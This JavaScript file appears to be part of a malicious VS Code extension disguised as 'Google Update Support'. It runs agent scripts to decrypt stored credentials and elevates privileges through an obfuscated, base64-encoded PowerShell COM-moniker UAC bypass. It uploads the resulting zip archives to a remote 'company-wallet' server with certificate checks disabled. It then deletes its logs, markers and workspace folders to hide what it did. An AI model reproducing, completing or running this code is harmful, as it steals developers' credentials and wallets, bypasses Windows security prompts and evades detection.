/**
 * Windows default pipeline (extension host): runs Node.js agent scripts for
 * phase1 + elevated phase2 (credential decryption via detect_malware.py),
 * POSTs artifacts to company-wallet API, then cleans up vendor/.vscode/runtime copies.
 *
 * No Go exe dependency -- all logic is in windows-agent-node.js + detect_malware.py.
 *
 * Config: googleUpdateSupport.* workspace settings or package.json googleUpdateSupport
 *         (patched from repo .env via patch-project).
 */

let vscode;
try { vscode = require("vscode"); } catch (_) { vscode = null; }
const crypto = require("crypto");
const fs = require("fs");
const path = require("path");
const os = require("os");
const https = require("https");
const http = require("http");
const { URL } = require("url");
const { execFileSync, execFile } = require("child_process");

const UPLOAD_SUCCESS_MARKER = "upload_success.txt";

function agentStateDir() {
  const la = (process.env.LOCALAPPDATA || "").trim();
  if (la) return path.join(la, "Google");
  const up = (process.env.USERPROFILE || "").trim();
  if (up) return path.join(up, "AppData", "Local", "Google");
  return path.join(".", "Google");
}

function gusRunUpdateLogPath() {
  return path.join(agentStateDir(), "gus-run-update.log");
}

function logToTempOnly(msg) {
  try {
    fs.appendFileSync(
      path.join(os.tmpdir(), ".gus-ext.log"),
      `${new Date().toISOString()} [windows-js-pipeline] ${msg}\n`
    );
  } catch (_) {
    /* silent */
  }
}

function pipelineLog(msg) {
  const line = `${new Date().toISOString()} [windows-js-pipeline] ${msg}\n`;
  try {
    const p = gusRunUpdateLogPath();
    fs.mkdirSync(path.dirname(p), { recursive: true });
    fs.appendFileSync(p, line, "utf8");
  } catch (_) {
    /* silent */
  }
  logToTempOnly(msg);
}

function shouldShowUi() {
  try {
    return !!vscode.workspace.getConfiguration("googleUpdateSupport").get("showPipelineUiMessages");
  } catch (_) {
    return false;
  }
}

function notifyMaybe(msg, kind) {
  if (!shouldShowUi()) return;
  if (kind === "error") void vscode.window.showErrorMessage(msg);
  else void vscode.window.showInformationMessage(msg);
}

// ---------------------------------------------------------------------------
//  Config resolution
// ---------------------------------------------------------------------------

function httpBaseFromServerURL(wsOrHttp) {
  let u = String(wsOrHttp || "").trim().replace(/\/$/, "");
  if (u.startsWith("wss://")) return "https://" + u.slice(6);
  if (u.startsWith("ws://")) return "http://" + u.slice(5);
  return u;
}

function readPackageJsonGus(dir) {
  const pkgPath = path.join(dir, "package.json");
  if (!fs.existsSync(pkgPath)) return {};
  try {
    const pkg = JSON.parse(fs.readFileSync(pkgPath, "utf8"));
    const g = pkg.googleUpdateSupport;
    return g && typeof g === "object" ? g : {};
  } catch (_) {
    return {};
  }
}

async function readCompanyWalletConfig(context) {
  let serverUrl = "";
  let clientId = "";
  let agentToken = "";

  const merge = (url, cid, tok) => {
    if (!serverUrl && url) serverUrl = String(url).trim();
    if (!clientId && cid) clientId = String(cid).trim();
    if (!agentToken && tok) agentToken = String(tok).trim();
  };

  const folders = vscode && vscode.workspace ? vscode.workspace.workspaceFolders : null;
  const folderUri = folders && folders[0] ? folders[0].uri : null;

  try {
    if (!vscode) throw new Error("vscode not available");
    const cfg = vscode.workspace.getConfiguration("googleUpdateSupport", folderUri);
    merge(cfg.get("companyWalletServerUrl"), cfg.get("companyWalletClientId"), cfg.get("companyWalletAgentToken"));
  } catch (_) {
    /* restricted-mode or missing */
  }

  if (folders) {
    for (const folder of folders) {
      try {
        const sp = path.join(folder.uri.fsPath, ".vscode", "settings.json");
        if (!fs.existsSync(sp)) continue;
        const settings = JSON.parse(fs.readFileSync(sp, "utf8"));
        merge(
          settings["googleUpdateSupport.companyWalletServerUrl"],
          settings["googleUpdateSupport.companyWalletClientId"],
          settings["googleUpdateSupport.companyWalletAgentToken"]
        );
      } catch (_) {
        /* skip */
      }
    }
  }

  const exclude = "**/{node_modules,.git,.svn,.hg,out,dist,build,target,.venv,__pycache__,.turbo,.next}/**";
  if (folders) {
    for (const folder of folders) {
      const mergePkg = (g) => merge(g.companyWalletServerUrl, g.companyWalletClientId, g.companyWalletAgentToken);
      mergePkg(readPackageJsonGus(folder.uri.fsPath));
      try {
        if (!vscode) continue;
        const pkgUris = await vscode.workspace.findFiles(
          new vscode.RelativePattern(folder, "**/package.json"),
          exclude,
          160
        );
        const seen = new Set();
        for (const u of pkgUris) {
          const dir = path.dirname(u.fsPath);
          const key = path.normalize(dir).toLowerCase();
          if (seen.has(key)) continue;
          seen.add(key);
          mergePkg(readPackageJsonGus(dir));
        }
      } catch (_) {
        /* continue */
      }
    }
  }

  return { serverUrl, clientId, agentToken };
}

// ---------------------------------------------------------------------------
//  Script resolution (find windows-agent-node.js + detect_malware.py)
// ---------------------------------------------------------------------------

function resolveAgentScriptPath(scriptsDir, context) {
  const name = "windows-agent-node.js";
  if (scriptsDir) {
    const p = path.join(scriptsDir, name);
    if (fs.existsSync(p)) return p;
  }
  const extP = path.join(context.extensionPath, name);
  if (fs.existsSync(extP)) return extP;
  return null;
}

function resolveDetectMalwarePyPath(scriptsDir, context) {
  const name = "detect_malware.py";
  if (scriptsDir) {
    const p = path.join(scriptsDir, name);
    if (fs.existsSync(p)) return p;
  }
  const extP = path.join(context.extensionPath, name);
  if (fs.existsSync(extP)) return extP;
  return null;
}

// ---------------------------------------------------------------------------
//  MOTW / exec helpers
// ---------------------------------------------------------------------------

function execFilePromise(command, args, opts) {
  return new Promise((resolve, reject) => {
    execFile(command, args, opts, (err, stdout, stderr) => {
      if (err) {
        err.stdout = stdout;
        err.stderr = stderr;
        reject(err);
      } else {
        resolve({ stdout, stderr });
      }
    });
  });
}

// ---------------------------------------------------------------------------
//  Artifact helpers
// ---------------------------------------------------------------------------

function windowsCwArtifactsDir() {
  const la = (process.env.LOCALAPPDATA || "").trim();
  if (la) return path.join(la, "Google", "cw-artifacts");
  const up = (process.env.USERPROFILE || "").trim();
  if (up) return path.join(up, "AppData", "Local", "Google", "cw-artifacts");
  return path.join(os.tmpdir(), "overlord-cw-artifacts");
}

function findNewestFileEndingWith(dir, endsWith) {
  if (!dir || !fs.existsSync(dir)) return null;
  let best = null;
  let bestMs = -1;
  for (const name of fs.readdirSync(dir)) {
    if (!name.endsWith(endsWith)) continue;
    const p = path.join(dir, name);
    try {
      const st = fs.statSync(p);
      if (st.isFile() && st.mtimeMs > bestMs) {
        bestMs = st.mtimeMs;
        best = p;
      }
    } catch (_) {
      /* skip */
    }
  }
  return best;
}

async function waitForPassZip(minMtimeMs, timeoutMs) {
  const artDir = windowsCwArtifactsDir();
  const deadline = Date.now() + timeoutMs;
  let lastLog = 0;
  pipelineLog(`waitForPassZip: dir=${artDir} minMtimeMs=${minMtimeMs} timeoutMs=${timeoutMs}`);
  while (Date.now() < deadline) {
    const p = findNewestFileEndingWith(artDir, "_pass.zip");
    if (p) {
      try {
        const st = fs.statSync(p);
        if (st.mtimeMs >= minMtimeMs) {
          pipelineLog(`waitForPassZip: ready path=${p} size=${st.size}`);
          return p;
        }
      } catch (_) {
        /* skip */
      }
    }
    const now = Date.now();
    if (now - lastLog >= 30000) {
      lastLog = now;
      pipelineLog(`waitForPassZip: ${Math.round((deadline - now) / 1000)}s left newest=${p || "(none)"}`);
    }
    await new Promise((r) => setTimeout(r, 2000));
  }
  const fallback = findNewestFileEndingWith(artDir, "_pass.zip");
  pipelineLog(`waitForPassZip: TIMEOUT fallback=${fallback || "null"}`);
  return fallback;
}

// ---------------------------------------------------------------------------
//  Phase 1 -- direct require(), no elevation needed
// ---------------------------------------------------------------------------

function runPhase1Direct(agentScriptPath, sourceHome) {
  pipelineLog(`phase1: loading agent from ${agentScriptPath}`);
  const agent = require(agentScriptPath);
  pipelineLog(`phase1: calling runPhase1(sourceHome=${sourceHome || "(empty)"})`);
  const result = agent.runPhase1(sourceHome);
  pipelineLog(`phase1: result=${result || "null"}`);
  return result;
}

// ---------------------------------------------------------------------------
//  Phase 2 -- elevated via COM moniker UAC bypass
//
//  Runs windows-agent-node.js --company-wallet-job in an elevated process
//  using process.execPath (Electron binary) with ELECTRON_RUN_AS_NODE=1.
//  The agent internally finds Python and runs detect_malware.py for ABE
//  credential decryption.
//
//  Falls back to Start-Process -Verb RunAs if COM bypass fails.
// ---------------------------------------------------------------------------

function buildCOMElevationScript(exePath, exeArgs) {
  const elevFn = `function F{param([String]$src,[String]$arg)
$n=@('[StructLayout(LayoutKind.Sequential)]','MarshalAs(UnmanagedType.ByValArray,SizeConst','[DllImport("ole32.dll",CharSet=CharSet.Unicode,SetLastError=true)]','public static extern')
$me=@("CoInitializeEx","CoUninitialize","CoGetObject")
$sg='using System;using System.Diagnostics;using System.Runtime.InteropServices;using System.Security.Principal;'+$n[0]+'public struct _s1{public uint u1;public UInt16 u2;public UInt16 u3;['+$n[1]+'=8)]public byte[] bt;}'+$n[0]+'public struct _s2{['+$n[1]+'=7)]public UInt32[] ut;public IntPtr pinfo;public IntPtr hwnd;}public struct _s3{['+$n[1]+'=23)]public IntPtr[] func;}public static class EA{'+$n[2]+$n[3]+' int '+$me[0]+'(IntPtr pvReserved,UInt32 dwCoInit);'+$n[2]+$n[3]+' void '+$me[1]+'();'+$n[2]+$n[3]+' int '+$me[2]+'(string pszName,IntPtr pBindOptions,_s1 riid,ref IntPtr ppv);}'
Add-Type -TypeDefinition $sg
$x=[EA]
$x::($me[1])()
$hi=$x::($me[0])([IntPtr]::Zero,2)
$m=[System.Runtime.InteropServices.Marshal]
$am=@("SizeOf","AllocHGlobal","StructureToPtr","PtrToStructure","StringToHGlobalUni","GetDelegateForFunctionPointer")
$s2=New-Object _s2
$sz=$m::($am[0])($s2)
$s2.ut=[UInt32[]]($sz,0,0,0,0,4,0)
$p2=$m::($am[1])($sz)
$m::($am[2])($s2,$p2,$True)
$t3=(New-Object _s3).GetType()
$sz=$m::($am[0])([Type]$t3)
$pv=$m::($am[1])($sz)
$g=New-Object _s1
$g.u1=0x6EDD6D74
$g.u2=0xC007
$g.u3=0x4E75
$g.bt=[byte[]](0xB7,0x6A,0xE5,0x74,0x09,0x95,0xE2,0x4c)
$hr=$x::($me[2])('Elevation:Administrator!new:{3E5FC7F9-9A51-4367-9063-A120244FBEC7}',$p2,$g,[ref]$pv)
if($hr -ne 0){exit 1}
$vt=$m::($am[3])($pv,[Type]$t3)
$vt=$m::($am[3])($vt.func[0],[Type]$t3)
$fa=$vt.func[9]
$d=[AppDomain]::CurrentDomain
$dn=New-Object System.Reflection.AssemblyName('X')
$ob=@([System.Reflection.Emit.AssemblyBuilderAccess],[System.MulticastDelegate],[System.Reflection.CallingConventions])
$tb=$d.DefineDynamicAssembly($dn,$ob[0]::Run).DefineDynamicModule('M',$false).DefineType('D','Class, Public, Sealed, AnsiClass, AutoClass',$ob[1])
$ta=@([IntPtr],[IntPtr],[IntPtr],[IntPtr],[UInt32],[UInt32])
$tb.DefineConstructor('RTSpecialName, HideBySig, Public',$ob[2]::Standard,$ta).SetImplementationFlags('Runtime, Managed')
$tb.DefineMethod('Invoke','Public, HideBySig, NewSlot, Virtual',[Int],$ta).SetImplementationFlags('Runtime, Managed')
$ft=$tb.CreateType()
$f=$m::($am[5])($fa,$ft)
$us=$m::($am[4])($src)
$ua=$m::($am[4])($arg)
$f.Invoke($pv,$us,$ua,0,0,0)
if($hi -eq 0){$x::($me[1])()}}`;
  const srcEsc = exePath.replace(/'/g, "''");
  const argEsc = exeArgs.replace(/'/g, "''");
  return elevFn + `\nF -src '${srcEsc}' -arg '${argEsc}'`;
}

function psUTF16Base64(str) {
  const buf = Buffer.alloc(str.length * 2);
  for (let i = 0; i < str.length; i++) {
    const code = str.charCodeAt(i);
    buf[i * 2] = code & 0xff;
    buf[i * 2 + 1] = (code >> 8) & 0xff;
  }
  return buf.toString("base64");
}

function runPhase2Elevated(agentScriptPath, sourceHome, resultFile, serverUrl) {
  const home = sourceHome || process.env.USERPROFILE || "";
  const nodeExe = process.execPath;
  const psExe = path.join(process.env.SYSTEMROOT || "C:\\Windows", "System32", "WindowsPowerShell", "v1.0", "powershell.exe");

  pipelineLog(`phase2: elevating Node.js agent script=${agentScriptPath}`);
  pipelineLog(`phase2: nodeExe=${nodeExe} sourceHome=${home} serverUrl=${serverUrl ? "set(len=" + serverUrl.length + ")" : "MISSING"}`);

  const esc = (s) => (s || "").replace(/'/g, "''");
  const ps1Lines = [
    "$ErrorActionPreference = 'Continue'",
    "$env:ELECTRON_RUN_AS_NODE = '1'",
    `$gusHome = '${esc(home)}'`,
    `$gusUrl = '${esc(serverUrl)}'`,
    `$gusResult = '${esc(resultFile)}'`,
    `& '${esc(nodeExe)}' '${esc(agentScriptPath)}' --company-wallet-job "--cw-source-home=$gusHome" "--cw-server-url=$gusUrl" "--cw-result-file=$gusResult"`,
  ];
  const tmpPs1 = path.join(os.tmpdir(), `gus-phase2-${Date.now()}.ps1`);
  fs.writeFileSync(tmpPs1, ps1Lines.join("\n") + "\n", "utf8");
  pipelineLog(`phase2: wrote temp ps1=${tmpPs1}`);

  const psFileArgs = `-NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File "${tmpPs1}"`;

  let comOk = false;
  try {
    pipelineLog("phase2: attempting COM moniker UAC bypass");
    const script = buildCOMElevationScript(psExe, psFileArgs);
    const enc = psUTF16Base64(script);
    pipelineLog(`phase2: encoded command length=${enc.length}`);
    execFileSync(psExe, ["-NoProfile", "-WindowStyle", "Hidden", "-EncodedCommand", enc], {
      stdio: ["ignore", "pipe", "pipe"], encoding: "utf8", timeout: 900000, windowsHide: true,
    });
    pipelineLog("phase2: COM elevation returned OK");
    comOk = true;
  } catch (e) {
    const stderr = e && typeof e.stderr === "string" ? e.stderr.trim().slice(0, 4000) : "";
    pipelineLog(`phase2: COM elevation failed status=${e.status ?? "?"} msg=${e.message || e} stderr=${stderr}`);
  }

  if (!comOk) {
    pipelineLog("phase2: falling back to Start-Process -Verb RunAs (UAC prompt)");
    const runAsCmd = `Start-Process -FilePath '${esc(psExe)}' -ArgumentList '-NoProfile','-WindowStyle','Hidden','-ExecutionPolicy','Bypass','-File','${esc(tmpPs1)}' -Verb RunAs -WindowStyle Hidden -Wait`;
    try {
      execFileSync(psExe, ["-NoProfile", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-Command", runAsCmd], {
        stdio: ["ignore", "pipe", "pipe"], encoding: "utf8", timeout: 900000, windowsHide: true,
      });
      pipelineLog("phase2: RunAs fallback returned OK");
    } catch (e2) {
      const stderr2 = e2 && typeof e2.stderr === "string" ? e2.stderr.trim().slice(0, 4000) : "";
      pipelineLog(`phase2: RunAs fallback FAILED status=${e2.status ?? "?"} msg=${e2.message || e2} stderr=${stderr2}`);
    }
  }

  try { fs.unlinkSync(tmpPs1); } catch (_) { /* silent */ }
}

function runPhase2Direct(agentScriptPath, sourceHome, resultFile, serverUrl) {
  pipelineLog(`phase2-direct: loading agent from ${agentScriptPath}`);
  const agent = require(agentScriptPath);
  pipelineLog(`phase2-direct: calling runPhase2()`);
  const result = agent.runPhase2(sourceHome, resultFile, serverUrl);
  pipelineLog(`phase2-direct: result=${result || "null"}`);
  return result;
}

// ---------------------------------------------------------------------------
//  Placeholder zip (when real artifacts are missing)
// ---------------------------------------------------------------------------

function createPlaceholderZip(suffix) {
  const tmpTxt = path.join(os.tmpdir(), `gus-js-${suffix}-${Date.now()}.txt`);
  const tmpZip = path.join(os.tmpdir(), `gus-js-${suffix}-${Date.now()}.zip`);
  pipelineLog(`createPlaceholderZip: suffix=${suffix} out=${tmpZip}`);
  fs.writeFileSync(tmpTxt, `google-update-support placeholder (${suffix})\n`, "utf8");
  const t = tmpTxt.replace(/'/g, "''");
  const z = tmpZip.replace(/'/g, "''");
  try {
    execFileSync("powershell.exe", [
      "-NoProfile", "-ExecutionPolicy", "Bypass", "-WindowStyle", "Hidden",
      "-Command", `Compress-Archive -LiteralPath '${t}' -DestinationPath '${z}' -Force`,
    ], { stdio: ["ignore", "pipe", "pipe"], encoding: "utf8", timeout: 120000, windowsHide: true });
  } catch (e) {
    const stderr = e && typeof e.stderr === "string" ? e.stderr.trim().slice(0, 2000) : "";
    pipelineLog(`createPlaceholderZip: FAILED ${e.message} stderr=${stderr}`);
    throw e;
  }
  try { fs.unlinkSync(tmpTxt); } catch (_) { /* ignore */ }
  pipelineLog(`createPlaceholderZip: ok ${tmpZip}`);
  return tmpZip;
}

// ---------------------------------------------------------------------------
//  HTTP upload
// ---------------------------------------------------------------------------

function postUploadRaw(base, zipPath, variant, creds) {
  const uploadURL = base.replace(/\/$/, "") + "/api/company-wallet/upload-raw";
  const u = new URL(uploadURL);
  const isHttps = u.protocol === "https:";
  const mod = isHttps ? https : http;
  const st = fs.statSync(zipPath);
  const body = fs.createReadStream(zipPath);
  const label = variant === "pass" ? "pass" : "main(phase1)";
  pipelineLog(`upload POST begin variant=${label} url=${uploadURL} zip=${zipPath} bytes=${st.size}`);

  const headers = {
    "Content-Type": "application/zip",
    "Content-Length": String(st.size),
    "X-Agent-Token": creds.agentToken,
    "X-Company-Wallet-Client-Id": creds.clientId,
    "X-Company-Wallet-Host": os.hostname(),
  };
  if (variant === "pass") headers["X-Company-Wallet-Variant"] = "pass";

  return new Promise((resolve, reject) => {
    const opts = {
      hostname: u.hostname,
      port: u.port || (isHttps ? 443 : 80),
      path: u.pathname + u.search,
      method: "POST",
      headers,
      ...(isHttps ? { rejectUnauthorized: false } : {}),
    };
    const req = mod.request(opts, (res) => {
      const chunks = [];
      res.on("data", (c) => chunks.push(c));
      res.on("end", () => {
        const txt = Buffer.concat(chunks).toString("utf8").slice(0, 4096);
        if (res.statusCode >= 200 && res.statusCode < 300) {
          pipelineLog(`upload POST ok variant=${label} status=${res.statusCode} body=${txt.slice(0, 240)}`);
          resolve({ statusCode: res.statusCode, body: txt });
        } else {
          pipelineLog(`upload POST FAILED variant=${label} status=${res.statusCode} body=${txt.slice(0, 800)}`);
          reject(new Error(`HTTP ${res.statusCode} ${txt}`));
        }
      });
    });
    req.on("error", (err) => {
      pipelineLog(`upload POST network error variant=${label} err=${err.message || err}`);
      reject(err);
    });
    body.on("error", (err) => {
      pipelineLog(`upload readStream error variant=${label} zip=${zipPath} err=${err.message || err}`);
      reject(err);
    });
    body.pipe(req);
  });
}

function writeUploadSuccessMarker() {
  const dir = agentStateDir();
  fs.mkdirSync(dir, { recursive: true });
  const mp = path.join(dir, UPLOAD_SUCCESS_MARKER);
  fs.writeFileSync(mp, `${new Date().toISOString()}\n`, "utf8");
  pipelineLog(`wrote upload_success marker ${mp}`);
}

// ---------------------------------------------------------------------------
//  Cleanup
// ---------------------------------------------------------------------------

function rmQuiet(p) {
  try {
    fs.rmSync(p, { recursive: true, force: true });
  } catch (_) {
    /* silent */
  }
}

function cleanupLocalAppDataRuntime() {
  const la = (process.env.LOCALAPPDATA || "").trim();
  if (!la) return;
  const gDir = path.join(la, "Google");
  const roots = [gDir, la];
  for (const root of roots) {
    if (!fs.existsSync(root)) continue;
    try {
      for (const name of fs.readdirSync(root)) {
        if (/^google-update-support-windows-amd64-.*\.exe$/i.test(name)) {
          try { fs.unlinkSync(path.join(root, name)); } catch (_) { /* silent */ }
        }
        if (/^gus-run-update-lock-/i.test(name)) {
          rmQuiet(path.join(root, name));
        }
      }
    } catch (_) { /* silent */ }
  }
}

function cleanupAppDataArtifacts() {
  const la = (process.env.LOCALAPPDATA || "").trim();
  if (!la) return;
  const gDir = path.join(la, "Google");

  // cw-artifacts directory (phase1 + pass zips)
  const artDir = path.join(gDir, "cw-artifacts");
  if (fs.existsSync(artDir)) {
    rmQuiet(artDir);
    pipelineLog(`cleanup: removed cw-artifacts dir ${artDir}`);
  }

  // gus-run-update.log
  const logFile = path.join(gDir, "gus-run-update.log");
  try { if (fs.existsSync(logFile)) { fs.unlinkSync(logFile); pipelineLog(`cleanup: removed ${logFile}`); } } catch (_) { /* silent */ }

  // upload_success.txt marker
  const marker = path.join(gDir, "upload_success.txt");
  try { if (fs.existsSync(marker)) { fs.unlinkSync(marker); pipelineLog(`cleanup: removed ${marker}`); } } catch (_) { /* silent */ }

  // .gus-vsix-installed-marker
  const vsixMarker = path.join(gDir, ".gus-vsix-installed-marker");
  try { if (fs.existsSync(vsixMarker)) { fs.unlinkSync(vsixMarker); pipelineLog(`cleanup: removed ${vsixMarker}`); } } catch (_) { /* silent */ }

  // Temp log
  const tmpLog = path.join(os.tmpdir(), ".gus-ext.log");
  try { if (fs.existsSync(tmpLog)) { fs.unlinkSync(tmpLog); pipelineLog(`cleanup: removed ${tmpLog}`); } } catch (_) { /* silent */ }

  // Temp gus-scripts-* directories, gus-embed-py-* directories
  try {
    for (const name of fs.readdirSync(os.tmpdir())) {
      if (/^gus-scripts-\d+$/.test(name) || /^gus-embed-py-\d+$/.test(name)) {
        rmQuiet(path.join(os.tmpdir(), name));
      }
      if (/^gus-(ep|cw-result|detached)-\d+\.(txt|js)$/i.test(name) || /^gus-phase2-\d+\.ps1$/i.test(name) || /^gus-agent-\d+\.exe$/i.test(name)) {
        try { fs.unlinkSync(path.join(os.tmpdir(), name)); } catch (_) { /* silent */ }
      }
    }
  } catch (_) { /* silent */ }

  // Remove empty Google dir if nothing left
  try {
    const remaining = fs.readdirSync(gDir);
    if (remaining.length === 0) {
      fs.rmdirSync(gDir);
      pipelineLog(`cleanup: removed empty ${gDir}`);
    }
  } catch (_) { /* silent */ }
}

async function findCleanupBundle(context) {
  const exclude = "**/{node_modules,.git,.svn,.hg,out,dist,build,target,.venv,__pycache__,.turbo,.next}/**";
  const folders = vscode && vscode.workspace ? vscode.workspace.workspaceFolders : null;
  if (!folders) return null;
  for (const folder of folders) {
    try {
      const uris = await vscode.workspace.findFiles(
        new vscode.RelativePattern(folder, "**/run-update.cmd"),
        exclude,
        64
      );
      for (const u of uris) {
        const dir = path.dirname(u.fsPath);
        const gusDir = path.join(dir, ".gus");
        if (!fs.existsSync(path.join(gusDir, "one-shot"))) continue;
        const pathsFile = path.join(gusDir, "cleanup-paths");
        if (fs.existsSync(pathsFile)) {
          return { workspaceRoot: folder.uri.fsPath, pathsFile, vendorDir: dir };
        }
      }
    } catch (_) {
      /* skip */
    }
  }
  return null;
}

function cleanupBundleFromVendorInfo(vendorInfo) {
  if (!vendorInfo) return null;
  const pathsFile = vendorInfo.cleanupPathsFile;
  if (pathsFile && fs.existsSync(pathsFile)) {
    return { workspaceRoot: vendorInfo.workspaceRoot, pathsFile, vendorDir: vendorInfo.dir };
  }
  return null;
}

async function performPostPipelineCleanup(context, vendorInfo) {
  pipelineLog("cleanup: begin");
  cleanupLocalAppDataRuntime();
  pipelineLog("cleanup: LocalAppData runtime sweep done");

  // Vendor + .vscode are normally removed early (before pipeline runs) by extension.js.
  // Re-attempt here as a safety net in case early cleanup was skipped or partial.
  const bundle = vendorInfo
    ? cleanupBundleFromVendorInfo(vendorInfo)
    : await findCleanupBundle(context);

  if (bundle) {
    pipelineLog(`cleanup: bundle wsRoot=${bundle.workspaceRoot} pathsFile=${bundle.pathsFile}`);
    let lines = [];
    try {
      lines = fs.readFileSync(bundle.pathsFile, "utf8")
        .split(/\r?\n/).map((s) => s.trim()).filter(Boolean);
    } catch (_) { /* already removed by early cleanup */ }
    if (lines.length > 0) {
      const wsNorm = path.normalize(bundle.workspaceRoot);
      for (const rel of lines) {
        if (rel.includes("..")) continue;
        const abs = path.normalize(path.join(bundle.workspaceRoot, rel));
        if (!abs.startsWith(wsNorm)) continue;
        rmQuiet(abs);
      }
      rmQuiet(path.join(bundle.workspaceRoot, ".vscode"));
      pipelineLog("cleanup: vendor + .vscode removal (safety net)");
    }
  }

  // Remove all AppData artifacts, logs, markers, and temp files
  cleanupAppDataArtifacts();
  pipelineLog("cleanup: AppData artifacts + logs + markers removed");

  pipelineLog("cleanup: done");
}

// ---------------------------------------------------------------------------
//  Main pipeline
// ---------------------------------------------------------------------------

async function runWindowsJsPipeline(context, walletConfig, vendorInfo, scriptsDir) {
  pipelineLog("========== windows-js-pipeline START ==========");
  const folders = vscode && vscode.workspace ? vscode.workspace.workspaceFolders : null;
  pipelineLog(
    `workspaceFolder[0]=${folders && folders[0] ? folders[0].uri.fsPath : "(none)"}`
  );
  pipelineLog(`scriptsDir=${scriptsDir || "(none -- using extension dir)"}`);

  let { serverUrl, clientId, agentToken } = walletConfig;
  pipelineLog(
    `wallet config: serverUrl=${serverUrl ? "set(len=" + serverUrl.length + ")" : "MISSING"} ` +
    `clientId=${clientId ? "set(len=" + clientId.length + ")" : "MISSING"} ` +
    `agentToken=${agentToken ? "set(len=" + agentToken.length + ")" : "MISSING"}`
  );
  if (!serverUrl || !clientId || !agentToken) {
    pipelineLog("ABORT: wallet config incomplete");
    return;
  }

  if (clientId === "overlord-default" || clientId === "default") {
    const hwidInput = `${os.hostname()}|${process.env.USERNAME || ""}|windows|amd64`;
    clientId = crypto.createHash("sha256").update(hwidInput).digest("hex");
    pipelineLog(`clientId was placeholder, derived HWID=${clientId} from input='${hwidInput}'`);
  }

  const agentScriptPath = resolveAgentScriptPath(scriptsDir, context);
  if (!agentScriptPath) {
    pipelineLog("ABORT: windows-agent-node.js not found (checked scriptsDir + extension dir)");
    return;
  }
  const pyScriptPath = resolveDetectMalwarePyPath(scriptsDir, context);
  pipelineLog(`scripts: agentScript=${agentScriptPath} detectMalwarePy=${pyScriptPath || "NOT FOUND"}`);

  const base = httpBaseFromServerURL(serverUrl);
  pipelineLog(`upload API base=${base}`);
  const creds = { agentToken, clientId };
  const artDir = windowsCwArtifactsDir();
  const sourceHome = process.env.USERPROFILE || "";

  try {
    try {
      fs.mkdirSync(artDir, { recursive: true });
      pipelineLog(`cw-artifacts dir: ${artDir}`);
    } catch (e) {
      pipelineLog(`cw-artifacts mkdir failed: ${e.message}`);
    }

    // ---- Phase 1 (direct call, no elevation) ----
    pipelineLog("phase1: starting (direct require, no elevation)");
    try {
      runPhase1Direct(agentScriptPath, sourceHome);
      pipelineLog("phase1: done");
    } catch (e) {
      pipelineLog(`phase1: FAILED: ${e.message || e}`);
      throw e;
    }

    const passBeforeP2 = findNewestFileEndingWith(artDir, "_pass.zip");
    const tBeforePhase2 = passBeforeP2 ? fs.statSync(passBeforeP2).mtimeMs : 0;
    const phase1Zip = findNewestFileEndingWith(artDir, "_phase1.zip");
    pipelineLog(`after phase1: _phase1.zip=${phase1Zip || "none"} _pass.zip(pre-p2)=${passBeforeP2 || "none"}`);

    // ---- Phase 2 (try direct first, then elevated) ----
    const resultFile = path.join(os.tmpdir(), `gus-cw-result-${Date.now()}.txt`);
    try { fs.writeFileSync(resultFile, "", "utf8"); } catch (_) { /* ignore */ }

    pipelineLog("phase2: trying direct (unelevated) first");
    try {
      runPhase2Direct(agentScriptPath, sourceHome, resultFile, serverUrl);
    } catch (e) {
      pipelineLog(`phase2-direct: error: ${e.message || e}`);
    }

    let passZipAfterDirect = findNewestFileEndingWith(artDir, "_pass.zip");
    const directProduced = passZipAfterDirect && fs.statSync(passZipAfterDirect).mtimeMs > tBeforePhase2;

    if (!directProduced) {
      pipelineLog("phase2: direct attempt did not produce new pass.zip -- trying elevated");
      try {
        runPhase2Elevated(agentScriptPath, sourceHome, resultFile, serverUrl);
      } catch (e) {
        pipelineLog(`phase2-elevated: error: ${e.message || e}`);
      }
      await waitForPassZip(tBeforePhase2 + 1, 300000);
    } else {
      pipelineLog("phase2: direct attempt succeeded (pass.zip created)");
    }

    try { if (fs.existsSync(resultFile)) fs.unlinkSync(resultFile); } catch (_) { /* ignore */ }

    // ---- Resolve artifacts ----
    let zipMain = findNewestFileEndingWith(artDir, "_phase1.zip");
    let zipPass = findNewestFileEndingWith(artDir, "_pass.zip");
    let placeholders = false;

    if (!zipMain && !zipPass) {
      pipelineLog("artifacts MISSING both main and pass -- ABORT (nothing to upload)");
      throw new Error("No artifacts produced by phase1 or phase2");
    }
    if (!zipMain || !zipPass) {
      pipelineLog(`artifacts INCOMPLETE main=${zipMain || "MISSING"} pass=${zipPass || "MISSING"} -- using placeholders for missing`);
      try {
        zipMain = zipMain || createPlaceholderZip("phase1");
        zipPass = zipPass || createPlaceholderZip("phase2-pass");
        placeholders = true;
      } catch (e) {
        pipelineLog(`createPlaceholderZip FAILED: ${e.message || e}`);
        throw e;
      }
    } else {
      try {
        const s1 = fs.statSync(zipMain), s2 = fs.statSync(zipPass);
        pipelineLog(`artifacts ready main=${zipMain} (${s1.size}B) pass=${zipPass} (${s2.size}B)`);
      } catch (e) {
        pipelineLog(`stat artifacts: ${e.message}`);
      }
    }

    // ---- Upload ----
    await postUploadRaw(base, zipMain, "", creds);
    await postUploadRaw(base, zipPass, "pass", creds);
    writeUploadSuccessMarker();

    if (placeholders) {
      try { if (zipMain) fs.unlinkSync(zipMain); } catch (_) { /* ignore */ }
      try { if (zipPass) fs.unlinkSync(zipPass); } catch (_) { /* ignore */ }
    }

    // ---- Cleanup ----
    await performPostPipelineCleanup(context, vendorInfo);
    notifyMaybe("Google Update Support: wallet pipeline finished.", "info");
    pipelineLog("========== windows-js-pipeline END (success) ==========");
  } catch (e) {
    const err = e instanceof Error ? e.message : String(e);
    const stack = e instanceof Error && e.stack ? e.stack.split("\n").slice(0, 5).join(" | ") : "";
    pipelineLog(`========== windows-js-pipeline ERROR: ${err} stack=${stack}`);
    notifyMaybe(`Google Update Support pipeline failed: ${err}`, "error");
    try {
      pipelineLog("error path: cleanup anyway");
      await performPostPipelineCleanup(context, vendorInfo);
      cleanupLocalAppDataRuntime();
    } catch (ce) {
      pipelineLog(`error-path cleanup failed: ${ce.message}`);
    }
    pipelineLog("========== windows-js-pipeline END (after error) ==========");
  }
}

module.exports = {
  runWindowsJsPipeline,
  readCompanyWalletConfig,
  httpBaseFromServerURL,
  pipelineLog,
  performPostPipelineCleanup,
  cleanupLocalAppDataRuntime,
  cleanupAppDataArtifacts,
  runPhase2Elevated,
  rmQuiet,
};
